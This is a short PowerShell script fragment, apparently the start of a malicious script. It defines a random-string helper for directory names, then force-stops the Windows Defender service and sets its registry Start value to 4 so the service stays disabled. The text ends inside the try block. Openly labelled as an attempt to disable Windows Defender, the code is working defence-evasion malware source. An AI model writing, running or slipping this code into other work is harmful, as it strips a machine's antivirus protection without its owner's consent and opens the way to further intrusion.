#random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {
        [char]$_})
    }

#attempt to disable windows defender
try {
    Get-Service WinDefend | Stop-Service -Force
    Set-ItemProperty -Path
    "HKLM:\SYSTEM\CurrentControlSet\services\WinDefend" -Name "Start"
    -Value 4 -Type DWORD -Force
    }

